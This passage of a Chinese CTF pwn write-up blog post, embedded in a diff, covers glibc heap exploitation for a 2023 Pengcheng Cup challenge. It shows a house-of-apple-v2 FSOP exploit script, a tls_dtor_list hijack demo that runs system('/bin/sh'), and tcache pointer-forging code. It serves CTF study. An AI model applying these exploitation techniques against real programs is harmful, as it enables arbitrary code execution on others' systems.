+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># # house of apple v2</span>
+</span></span><span style="display:flex;"><span>fs <span style="color:#ff79c6">=</span> FileStructure()
+</span></span><span style="display:flex;"><span>fs<span style="color:#ff79c6">.</span>vtable <span style="color:#ff79c6">=</span> libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>_IO_wfile_jumps
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># write_base &lt; write_ptr</span>
+</span></span><span style="display:flex;"><span>fs<span style="color:#ff79c6">.</span>_IO_write_base <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>fs<span style="color:#ff79c6">.</span>_IO_write_ptr <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>
+</span></span><span style="display:flex;"><span>fs<span style="color:#ff79c6">.</span>chain <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># fs._lock = libc.sym._IO_stdfile_2_lock</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># lock 检查</span>
+</span></span><span style="display:flex;"><span>fs<span style="color:#ff79c6">.</span>_lock <span style="color:#ff79c6">=</span> libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x1d5a20</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># # codecvt = ?</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># fs._codecvt = ?</span>
+</span></span><span style="display:flex;"><span>fs<span style="color:#ff79c6">.</span>_wide_data <span style="color:#ff79c6">=</span> heap_base <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0xff0</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x500</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">bytes</span>(fs)[<span style="color:#bd93f9">0x10</span>:]
+</span></span><span style="display:flex;"><span>edit(<span style="color:#bd93f9">1</span>, <span style="color:#8be9fd;font-style:italic">len</span>(payload) <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>, payload <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>wdata <span style="color:#ff79c6">=</span> fit({
+</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0xe0</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x10</span>: heap_base<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0xff0</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0xe0</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x10</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x500</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0xe0</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#bd93f9">0x68</span>: libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>system
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}, filler<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)
+</span></span><span style="display:flex;"><span>edit(<span style="color:#bd93f9">4</span>, <span style="color:#8be9fd;font-style:italic">len</span>(wdata) <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>, wdata <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>lg(<span style="color:#f1fa8c">&#34;heap_addr&#34;</span>)
+</span></span><span style="display:flex;"><span>lg(<span style="color:#f1fa8c">&#34;heap_base&#34;</span>)
+</span></span><span style="display:flex;"><span>lg(<span style="color:#f1fa8c">&#34;leak&#34;</span>)
+</span></span><span style="display:flex;"><span>lg(<span style="color:#f1fa8c">&#34;libc.address&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;a&#34;</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x4f0</span> <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;     sh;&#34;</span>  <span style="color:#6272a4"># flag rdi</span>
+</span></span><span style="display:flex;"><span>edit(<span style="color:#bd93f9">0</span>, <span style="color:#8be9fd;font-style:italic">len</span>(payload), payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># dbg(p)</span>
+</span></span><span style="display:flex;"><span>menu(<span style="color:#bd93f9">5</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>itr()
+</span></span></code></pre></div><p>主要利用large bin leak，但是因为其可以使用tcache bin，看到了其他的利用手段</p>
+<ul>
+<li>最终tcache修改TLS，通过__call_tls_dtors函数实现system(“/bin/sh”)</li>
+<li>IO leak 栈地址，然后跳转到栈上进行指向函数。</li>
+</ul>
+<h3 id="tls_dtor">tls_dtor</h3>
+<p>一种比较简单的利用手段，正常情况下存在如下的调用链</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>exit
+</span></span><span style="display:flex;"><span>	__run_exit_handlers
+</span></span><span style="display:flex;"><span>		__call_tls_dtors
+</span></span></code></pre></div><p>其函数实现如下</p>
+<ul>
+<li>一个全局变量是否存在</li>
+<li>找到其函数指针</li>
+<li><code>PTR_DEMANGLE</code> 计算函数地址</li>
+<li>调用函数</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">void</span>
+</span></span><span style="display:flex;"><span><span style="color:#50fa7b">__call_tls_dtors</span> (<span style="color:#8be9fd">void</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">while</span> (tls_dtor_list)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">dtor_list</span> <span style="color:#ff79c6">*</span>cur <span style="color:#ff79c6">=</span> tls_dtor_list;
+</span></span><span style="display:flex;"><span>      dtor_func func <span style="color:#ff79c6">=</span> cur<span style="color:#ff79c6">-&gt;</span>func;
+</span></span><span style="display:flex;"><span>      PTR_DEMANGLE (func);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      tls_dtor_list <span style="color:#ff79c6">=</span> tls_dtor_list<span style="color:#ff79c6">-&gt;</span>next;
+</span></span><span style="display:flex;"><span>      func (cur<span style="color:#ff79c6">-&gt;</span>obj);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#6272a4">/* Ensure that the MAP dereference happens before
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">	 l_tls_dtor_count decrement.  That way, we protect this access from a
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">	 potential DSO unload in _dl_close_worker, which happens when
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">	 l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */</span>
+</span></span><span style="display:flex;"><span>      atomic_fetch_add_release (<span style="color:#ff79c6">&amp;</span>cur<span style="color:#ff79c6">-&gt;</span>map<span style="color:#ff79c6">-&gt;</span>l_tls_dtor_count, <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>);
+</span></span><span style="display:flex;"><span>      free (cur);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>libc_hidden_def (__call_tls_dtors)
+</span></span></code></pre></div><p>其结构体如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#50fa7b">void</span> (<span style="color:#ff79c6">*</span>dtor_func) (<span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">// destructor list
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">dtor_list</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  dtor_func func;
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>obj;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">link_map</span> <span style="color:#ff79c6">*</span>map;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">dtor_list</span> <span style="color:#ff79c6">*</span>next;
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>PTR_DEMANGLE 这个宏计算函数地址</p>
+<ul>
+<li>循环右移0x11位</li>
+<li>与 pointer_guard 进行异或</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6"># define PTR_DEMANGLE(reg)	ror $2*LP_SIZE+1, reg;			      \
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">				xor %fs:POINTER_GUARD, reg
+</span></span></span></code></pre></div><p>正常情况下，这个值为0，不会调用如下的函数</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; p tls_dtor_list
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$1</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>struct dtor_list *<span style="color:#ff79c6">)</span> 0x0
+</span></span></code></pre></div><p>因为这里没有什么检查，因此我们可以攻击这个值，让其指向我们伪造的一个 <code>dtor_list</code> 结构体。</p>
+<ul>
+<li>func 首先获得地址，先于 pointer_guard 进行异或，然后在进行循环左移11位</li>
+<li>obj 作为函数参数指针。</li>
+</ul>
+<p>在汇编中</p>
+<ul>
+<li>tls_dtor_list 也在 fs 附近</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; <span style="color:#8be9fd;font-style:italic">set</span> <span style="color:#8be9fd;font-style:italic">tls_dtor_list</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span>   <span style="color:#6272a4"># 进入循环，寻找偏移</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pwndbg&gt; p <span style="color:#8be9fd;font-style:italic">$rbp</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$4</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>void *<span style="color:#ff79c6">)</span> 0xffffffffffffffb0
+</span></span><span style="display:flex;"><span>pwndbg&gt; p <span style="color:#ff79c6">(</span>long<span style="color:#ff79c6">)</span><span style="color:#8be9fd;font-style:italic">$rbp</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$5</span> <span style="color:#ff79c6">=</span> -80
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>0x7ffff7e02606 &lt;__call_tls_dtors+6&gt;     mov    rbp, qword ptr <span style="color:#ff79c6">[</span>rip + 0x194773<span style="color:#ff79c6">]</span>
+</span></span><span style="display:flex;"><span>0x7ffff7e0260d &lt;__call_tls_dtors+13&gt;    mov    rbx, qword ptr fs:<span style="color:#ff79c6">[</span>rbp<span style="color:#ff79c6">]</span>
+</span></span><span style="display:flex;"><span>0x7ffff7e02612 &lt;__call_tls_dtors+18&gt;    <span style="color:#8be9fd;font-style:italic">test</span>   rbx, rbx                        <span style="color:#6272a4"># 这里就是tls_dtor_list 值</span>
+</span></span><span style="display:flex;"><span>0x7ffff7e02615 &lt;__call_tls_dtors+21&gt;    je     __call_tls_dtors+94                &lt;__call_tls_dtors+94&gt;
+</span></span><span style="display:flex;"><span>0x7ffff7e02617 &lt;__call_tls_dtors+23&gt;    nop    word ptr <span style="color:#ff79c6">[</span>rax + rax<span style="color:#ff79c6">]</span>
+</span></span><span style="display:flex;"><span>► 0x7ffff7e02620 &lt;__call_tls_dtors+32&gt;    mov    rdx, qword ptr <span style="color:#ff79c6">[</span>rbx + 0x18<span style="color:#ff79c6">]</span>   <span style="color:#6272a4"># next 指针</span>
+</span></span><span style="display:flex;"><span>0x7ffff7e02624 &lt;__call_tls_dtors+36&gt;    mov    rax, qword ptr <span style="color:#ff79c6">[</span>rbx<span style="color:#ff79c6">]</span>            <span style="color:#6272a4"># func</span>
+</span></span><span style="display:flex;"><span>0x7ffff7e02627 &lt;__call_tls_dtors+39&gt;    ror    rax, 0x11                       <span style="color:#6272a4"># 循环右移</span>
+</span></span><span style="display:flex;"><span>0x7ffff7e0262b &lt;__call_tls_dtors+43&gt;    xor    rax, qword ptr fs:<span style="color:#ff79c6">[</span>0x30<span style="color:#ff79c6">]</span>        <span style="color:#6272a4"># pointer_guard </span>
+</span></span><span style="display:flex;"><span>0x7ffff7e02634 &lt;__call_tls_dtors+52&gt;    mov    qword ptr fs:<span style="color:#ff79c6">[</span>rbp<span style="color:#ff79c6">]</span>, rdx
+</span></span><span style="display:flex;"><span>0x7ffff7e02639 &lt;__call_tls_dtors+57&gt;    mov    rdi, qword ptr <span style="color:#ff79c6">[</span>rbx + 8<span style="color:#ff79c6">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pwndbg&gt; x/xg <span style="color:#8be9fd;font-style:italic">$fs_base</span>+0x30
+</span></span><span style="display:flex;"><span>0x7ffff7dc1770: 0x851e64b26accf332
+</span></span></code></pre></div><p>我们需要将伪造的结构体中函数地址进行一个移位运算</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">rol</span>(addr):
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">return</span> ((addr <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">0x11</span>) <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0xffffffffffffffff</span>) <span style="color:#ff79c6">|</span> (addr <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#bd93f9">0x2f</span>)
+</span></span></code></pre></div><p>一个小demo，来自 <a href="https://zhuanlan.zhihu.com/p/654914149">glibc2.35-通过tls_dtor_list劫持exit执行流程</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;string.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span> <span style="color:#50fa7b">rotate_left</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span> value, <span style="color:#8be9fd">int</span> left) {
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> (value <span style="color:#ff79c6">&lt;&lt;</span> left) <span style="color:#ff79c6">|</span> (value <span style="color:#ff79c6">&gt;&gt;</span> (<span style="color:#ff79c6">sizeof</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span>) <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">8</span> <span style="color:#ff79c6">-</span> left));
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span> fs_base;
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span> index <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xffffffffffffffa8</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span> tls_dtor_list_addr;
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span> random_number;
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>system_ptr <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;</span>system;
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;system:%p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, system_ptr);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">asm</span>(<span style="color:#f1fa8c">&#34;mov %%fs:0, %0&#34;</span> <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;=r&#34;</span>(fs_base));
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;Value in FS register: 0x%llx</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, fs_base);
+</span></span><span style="display:flex;"><span>  tls_dtor_list_addr <span style="color:#ff79c6">=</span> fs_base <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">80</span>;
+</span></span><span style="display:flex;"><span>  random_number <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span> <span style="color:#ff79c6">*</span>)(fs_base <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x30</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>str_bin_sh <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x20</span>);
+</span></span><span style="display:flex;"><span>  strcpy(str_bin_sh, <span style="color:#f1fa8c">&#34;/bin/sh&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>ptr <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x20</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span> <span style="color:#ff79c6">*</span>)ptr <span style="color:#ff79c6">=</span>
+</span></span><span style="display:flex;"><span>      rotate_left((<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span>)system_ptr <span style="color:#ff79c6">^</span> random_number, <span style="color:#bd93f9">0x11</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span> <span style="color:#ff79c6">*</span>)(ptr <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">8</span>) <span style="color:#ff79c6">=</span> str_bin_sh;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#8be9fd">long</span> <span style="color:#ff79c6">*</span>)tls_dtor_list_addr <span style="color:#ff79c6">=</span> ptr;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>在高版本 的 tcache bin attack 里也可以使用这个。</p>
+<ul>
+<li>tcache fd 加密问题。</li>
+</ul>
+<p>如下为 chunk 放入 tcache bin 相关的函数。</p>
+<ul>
+<li>因为 header 的存在，第一步将 chunk 转化成 tcache_entry</li>
+<li>key 为一个随机数</li>
+<li>next指针计算，next指针的地址右移12位，然后与 <code>prev tcache bin</code> 指针进行 <code>xor</code> 运算。</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">#define chunk2mem(p) ((void*)((char*)(p) + CHUNK_HDR_SZ))
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define PROTECT_PTR(pos, ptr) \
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">tcache_entry</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">tcache_entry</span> <span style="color:#ff79c6">*</span>next;                <span style="color:#6272a4">// 常说的 fd 指针 
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#6272a4">/* This field exists to detect double frees.  */</span>
+</span></span><span style="display:flex;"><span>  uintptr_t key;
+</span></span><span style="display:flex;"><span>} tcache_entry;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">tcache_perthread_struct</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">uint16_t</span> counts[TCACHE_MAX_BINS];
+</span></span><span style="display:flex;"><span>  tcache_entry <span style="color:#ff79c6">*</span>entries[TCACHE_MAX_BINS];
+</span></span><span style="display:flex;"><span>} tcache_perthread_struct;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">static</span> __thread tcache_perthread_struct <span style="color:#ff79c6">*</span>tcache <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">NULL</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">static</span> __always_inline <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">tcache_put</span>(mchunkptr chunk, size_t tc_idx) {
+</span></span><span style="display:flex;"><span>  tcache_entry <span style="color:#ff79c6">*</span>e <span style="color:#ff79c6">=</span> (tcache_entry <span style="color:#ff79c6">*</span>)chunk2mem(chunk);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">/* Mark this chunk as &#34;in the tcache&#34; so the test in _int_free will
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">     detect a double free.  */</span>
+</span></span><span style="display:flex;"><span>  e<span style="color:#ff79c6">-&gt;</span>key <span style="color:#ff79c6">=</span> tcache_key;      <span style="color:#6272a4">// 一个随机数，tcache_key_initialize (void) 生成
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>  e<span style="color:#ff79c6">-&gt;</span>next <span style="color:#ff79c6">=</span> PROTECT_PTR(<span style="color:#ff79c6">&amp;</span>e<span style="color:#ff79c6">-&gt;</span>next, tcache<span style="color:#ff79c6">-&gt;</span>entries[tc_idx]);
+</span></span><span style="display:flex;"><span>  tcache<span style="color:#ff79c6">-&gt;</span>entries[tc_idx] <span style="color:#ff79c6">=</span> e;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">++</span>(tcache<span style="color:#ff79c6">-&gt;</span>counts[tc_idx]);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>可以做一个测试，查看tcache 的next指针。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; x/20xg 0x555555559290
+</span></span><span style="display:flex;"><span>0x555555559290: 0x0000000000000000      0x0000000000000051
+</span></span><span style="display:flex;"><span>0x5555555592a0: 0x0000000555555559      0xa8d3bb0dc1ab0725
+</span></span><span style="display:flex;"><span>0x5555555592b0: 0x0000000000000000      0x0000000000000000
+</span></span><span style="display:flex;"><span>0x5555555592c0: 0x0000000000000000      0x0000000000000000
+</span></span><span style="display:flex;"><span>0x5555555592d0: 0x0000000000000000      0x0000000000000000
+</span></span><span style="display:flex;"><span>0x5555555592e0: 0x0000000000000000      0x0000000000000051
+</span></span><span style="display:flex;"><span>0x5555555592f0: 0x000055500000c7f9      0xa8d3bb0dc1ab0725
+</span></span><span style="display:flex;"><span>0x555555559300: 0x0000000000000000      0x0000000000000000
+</span></span><span style="display:flex;"><span>0x555555559310: 0x0000000000000000      0x0000000000000000
+</span></span><span style="display:flex;"><span>0x555555559320: 0x0000000000000000      0x0000000000000000
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pwndbg&gt; p/x <span style="color:#ff79c6">(</span>0x5555555592f0 &gt;&gt; 12<span style="color:#ff79c6">)</span> ^ 0x5555555592a0
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$1</span> <span style="color:#ff79c6">=</span> 0x55500000c7f9
+</span></span></code></pre></div><p>因此我们伪造fd。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>(addr <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#bd93f9">12</span>) <span style="color:#ff79c6">^</span> pos
+</span></span></code></pre></div><h2 id="参考">参考</h2>
+<ul>
+<li><a href="https://kagehutatsu.com/?p=951">2023 鹏城杯 Pwn 部分Writeup</a></li>
+<li><a href="https://blog.xmcve.com/2023/11/05/%E9%B9%8F%E5%9F%8E%E6%9D%AF2023-Writeup/#title-7">鹏城杯2023 Writeup</a></li>
+<li><a href="https://unauth401.tech/pcb2023/#baby-heap">鹏城杯 2023 初赛 Pwn WriteUp</a></li>
+<li><a href="https://mp.weixin.qq.com/s/tjz3urSdsQac30JiqVN62Q">2023第三届“鹏城杯”线上初赛WriteUp</a></li>
+<li><a href="https://www.cnblogs.com/ZIKH26/articles/16066329.html">DASCTF2022_checkin - ZikH26</a></li>
+</ul>
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/pwn">PWN</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+		<div id="disqus_thread"></div>
+<script type="text/javascript">
+    (function () {
+        
+        
+        if (window.location.hostname == "localhost")
+            return;
+
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        var disqus_shortname = 'ldrx30';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+
+</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/ldrx30" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    2024  © ldrx30 |  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
